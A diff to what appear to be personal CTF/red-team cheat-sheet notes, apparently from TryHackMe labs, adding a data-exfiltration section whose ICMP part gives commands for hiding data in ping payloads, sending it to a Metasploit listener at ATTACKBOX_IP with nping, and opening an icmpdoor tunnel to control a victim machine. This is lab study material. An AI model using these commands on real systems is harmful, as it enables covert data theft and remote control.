@@ -16,17 +16,9 @@ When dealing with a certain challenge, you have to come up with a plan to come u
 - [Knowledge Bases](#knowledge-bases)
 - [Cheatsheets](#cheatsheets)
 - [Tools Top Tips](#tools-top-tips)
-- [Active Directory](#active-directory)
-- [Command Injection](3command-injection)
-- [Domain Enumeration](#domain-enumeration)
-- [Hashes](#hashes)
-- [Lateral Movement - Pass the Hash](#lateral-movement---pass-the-hash)
+- [Data Exfiltration](#data-exfiltration)
 - [Misc](#misc)
 - [Persistence](#persistence)
-- [Windows Defender Anti-Virus](#windows-defender-anti-virus)
-- [XSS - Cross Site Scripting](#xss---cross-site-scripting)
-
-<br>
 
 ## Knowledge Bases
 
@@ -34,7 +26,114 @@ When dealing with a certain challenge, you have to come up with a plan to come u
 -- | -- | --
 **** |  | 
 
-<br>
+## Cheatsheets
+
+🔰 Name | ℹ️ Description | 🔗 Link
+-- | -- | --
+**** |  | 
+
+## Tools Top Tips
+
+🔰 Name | ℹ️ Description | 🔗 Link
+-- | -- | --
+**** |  | 
+
+## Data Exfiltration
+
+
+
+### TCP Socket
+
+
+
+### SSH
+
+
+
+### HTTP(S)
+
+
+
+### ICMP
+
+Sending data with an ICMP ping packet
+
+#### Manually
+
+Convert payload into hex, for example with xxd.
+
+```bash
+echo "thm:tryhackme" | xxd -p
+```
+
+Send a ping request with the payload.
+
+```bash
+ping <IP> -c <nr of requests> -p <payload in hex format>
+
+ping 10.10.230.138 -c 1 -p 74686d3a7472796861636b6d650a 
+```
+
+Capture the request with e.g., Wireshark.
+
+#### MetaSploit
+
+Select the `icmp_exfill` module to set a listener to capture any ICMP packets. It starts recording upon receiving a trigger and ends when an EOF trigger is received.
+
+Set the correct interface to listen on.
+
+```bash
+use auxiliary/server/icmp_exfil
+set BPF_FILTER icmp and not src ATTACKBOX_IP
+set INTERFACE eth0
+run
+```
+
+Now Metasploit is waiting for a beginning of file trigger as stated.
+
+Using nping or regular ping send a BOF trigger to start recording data (from the victim machine).
+
+```bash
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
+```
+
+Send the rest of the data in a similar manner.
+
+Send the EOF trigger.
+
+```bash
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "OEF"
+```
+
+Find the loot in the location as stated (on the attack machine).
+
+#### Tunneling
+
+ICMPDoor tool can be used to create an ICMP tunnel.
+
+🔗 https://github.com/krabelize/icmpdoor
+
+Setup a host on the victim machine.
+
+```bash
+sudo icmpdoor -i eth0 -d 192.168.0.133
+```
+
+Setup a client on the attack machine
+
+```bash
+sudo icmp-cnc -i eth1 -d 192.168.0.121
+```
+
+Send commands to the victim machine as usual.
+
+### DNS
+
+
+
+## Misc
+
+
 
 ## Persistence
 
